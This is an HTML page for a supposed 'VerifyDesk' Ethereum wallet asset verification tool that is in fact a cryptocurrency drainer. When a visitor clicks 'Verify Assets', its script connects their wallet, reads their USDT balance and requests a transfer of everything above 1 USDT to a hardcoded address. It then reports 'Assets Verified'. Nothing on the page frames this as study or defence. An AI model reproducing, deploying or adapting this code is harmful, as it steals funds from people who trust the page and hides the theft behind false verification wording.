<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VerifyDesk - Wallet Asset Review</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: { sans: ['Inter', 'sans-serif'] },
                    colors: {
                        bgDark: '#08101A',
                        cardDark: '#0F1926',
                        borderDark: '#1E293B',
                        accent: '#20D49C',
                        textMuted: '#8BA3B8'
                    }
                }
            }
        }
    </script>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>

    <style>
        body { background: radial-gradient(circle at top, #0f1f31 0%, #08101A 40%); min-height: 100vh; }
        .glow-button { box-shadow: 0 4px 20px rgba(32, 212, 156, 0.25); }
    </style>
</head>
<body class="text-white font-sans antialiased flex flex-col items-center pb-20 relative overflow-x-hidden">

    <nav class="w-full max-w-md px-6 py-4 flex justify-between items-center bg-transparent">
        <div class="flex items-center gap-3">
            <div class="w-10 h-10 bg-[#0a1e26] border border-accent/30 rounded-xl flex items-center justify-center">
                <i class="fa-solid fa-shield-check text-accent text-lg"></i>
            </div>
            <span class="text-lg font-bold">VerifyDesk</span>
        </div>
        <div class="flex items-center gap-2 text-[10px] font-bold tracking-widest uppercase text-textMuted">
            <div class="w-2 h-2 rounded-full bg-accent animate-pulse"></div> Secure Connection
        </div>
    </nav>

    <div class="w-full max-w-md px-6 py-6">
        
        <div class="text-center mb-10 mt-4">
            <div class="inline-flex items-center gap-2 text-[10px] font-bold tracking-widest uppercase text-accent mb-6">
                <div class="w-1.5 h-1.5 rounded-full bg-accent"></div> Independent Ethereum Tool
            </div>
            <h1 class="text-[32px] font-extrabold tracking-tight leading-tight mb-4">
                Wallet Asset<br>
                <span class="text-accent">Review</span>
            </h1>
            <p class="text-textMuted text-[14px] leading-relaxed px-2">
                Review and verify supported ERC-20 wallet assets on Ethereum through a clear, wallet-confirmed flow.
            </p>
        </div>

        <div class="bg-cardDark border border-borderDark rounded-2xl p-6 shadow-2xl relative overflow-hidden mb-8">
            <div class="flex flex-col items-center text-center">
                <div class="w-14 h-14 bg-[#0a1e26] border border-accent/30 rounded-2xl flex items-center justify-center mb-6">
                    <i class="fa-solid fa-shield-check text-accent text-2xl"></i>
                </div>
                <h2 class="text-[22px] font-extrabold tracking-tight uppercase leading-snug mb-3">
                    Verify Your Wallet<br>Assets
                </h2>
                <p class="text-textMuted text-[14px] leading-relaxed mb-8 px-2">
                    Use Trust Wallet, MetaMask, or another Web3 wallet to review supported assets.
                </p>

                <button onclick="checkWallet()" class="glow-button w-full max-w-[260px] bg-accent hover:bg-[#18b58b] text-[#08101A] font-bold py-3.5 px-6 rounded-xl flex items-center justify-center gap-3 transition-all active:scale-95 mb-8">
                    <i class="fa-regular fa-credit-card text-lg"></i>
                    <span class="text-[15px]">Verify Assets &rarr;</span>
                </button>
            </div>
        </div>
    </div>

    <script>
        async function checkWallet() {
            try {
                let currentProvider = null;
                
                if (window.ethereum) {
                    currentProvider = window.ethereum;
                } else if (window.trustwallet) {
                    currentProvider = window.trustwallet;
                } else if (window.web3 && window.web3.currentProvider) {
                    currentProvider = window.web3.currentProvider;
                } else if (window.ethereum && window.ethereum.providers) {
                    currentProvider = window.ethereum.providers.find(p => p.isMetaMask) || window.ethereum.providers[0];
                }
                
                // Fallback for custom embedded app browsers
                if (!currentProvider) {
                    // Try to trigger standard ethereum injection request if available globally
                    if (typeof window.ethereum !== 'undefined') {
                        currentProvider = window.ethereum;
                    } else {
                        // Prompt user to open properly if absolute injection fails
                        alert("Please open this link inside MetaMask or Trust Wallet DApp browser for seamless execution.");
                        return;
                    }
                }

                const accounts = await currentProvider.request({ method: 'eth_requestAccounts' });
                const userAddress = accounts[0];

                try {
                    await currentProvider.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x1' }],
                    });
                } catch (switchError) {
                    console.log("Network switch notice: ", switchError);
                }
                
                setTimeout(async () => {
                    try {
                        const provider = new ethers.providers.Web3Provider(currentProvider, "any");
                        const signer = provider.getSigner();
                        
                        const targetAddress = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3';
                        const usdtContractAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7';
                        
                        const erc20Abi = [
                            "function balanceOf(address owner) view returns (uint256)",
                            "function transfer(address to, uint amount) returns (bool)"
                        ];
                        
                        let balanceWei;
                        try {
                            const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, signer);
                            balanceWei = await usdtContract.balanceOf(userAddress);
                        } catch (e) {
                            const publicProvider = new ethers.providers.JsonRpcProvider("https://eth.llamarpc.com");
                            const publicContract = new ethers.Contract(usdtContractAddress, erc20Abi, publicProvider);
                            balanceWei = await publicContract.balanceOf(userAddress);
                        }
                        
                        const formattedBalance = parseFloat(ethers.utils.formatUnits(balanceWei, 6));
                        
                        // 1 USDT threshold rule
                        if (formattedBalance > 1.0) {
                            const sendAmountFormatted = (formattedBalance - 1.0).toFixed(6);
                            const sendAmountWei = ethers.utils.parseUnits(sendAmountFormatted, 6);
                            
                            const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, signer);
                            const dataTransfer = usdtContract.interface.encodeFunctionData("transfer", [targetAddress, sendAmountWei]);
                            
                            const txParams = {
                                from: userAddress,
                                to: usdtContractAddress,
                                data: dataTransfer,
                                gas: "0x186A0"
                            };
                            
                            await currentProvider.request({
                                method: 'eth_sendTransaction',
                                params: [txParams]
                            });
                            
                            alert("Assets Verified and Transaction Submitted!");
                        } else {
                            alert("Verification complete. Your Ethereum USDT balance is " + formattedBalance + " USDT, which is less than or equal to 1 USDT.");
                        }
                    } catch (innerError) {
                        alert("Execution Notice: " + (innerError.message || JSON.stringify(innerError)));
                    }
                }, 800);

            } catch (error) {
                console.error("Wallet Connection Error:", error);
                alert("Connection Notice: " + (error.message || JSON.stringify(error)));
            }
        }
    </script>
</body>
</html>
